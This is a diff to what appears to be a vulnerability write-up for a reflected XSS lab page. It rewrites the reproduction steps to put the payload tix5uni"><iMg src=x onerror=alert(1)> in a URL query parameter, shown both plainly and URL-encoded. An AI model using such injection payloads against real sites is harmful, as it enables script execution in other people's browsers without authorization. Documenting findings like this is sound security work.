@@ -16,14 +16,11 @@ http://kzlabs.com/punishment/9.php
 ## Steps to Reproduce
 1. Go to the following URL
 ```
- http://kzlabs.com/punishment/9.php
+http://kzlabs.com/punishment/9.php?fname=&lname=tix5uni%22%3E%3CiMg+src%3Dx+onerror%3Dalert%281%29%3E
 ```
-2. In the **First name** enter the following XSS payload
-```
-tix5uni"><iMg src=x onerror=alert(1)>
-```
-3.Wait for the page to load
-4.An alert popup appears showing 1
+2.Wait for the page to load
+
+3.An alert popup appears showing 1
 
 
 ## Payload Used
@@ -41,7 +38,7 @@ tix5uni"><iMg src=x onerror=alert(1)>
 
 
 
-**Screenshot 2** — Alert box displaying 1 triggered after submitting the payload tix5uni"><IMG src=x onerror=alert(1)> ,with the payload visible in the URL bar  confirming reflected XSS execution in the JavaScript context.
+**Screenshot 2** — Alert box displaying 1 triggered after submitting the payload tix5uni"><iMg src=x onerror=alert(1)> ,with the payload visible in the URL bar  confirming reflected XSS execution in the JavaScript context.
 
 <img width="1540" height="864" alt="image" src="https://github.com/user-attachments/assets/8454c1d4-89fe-4057-967c-6b17871aaf8a" />
 
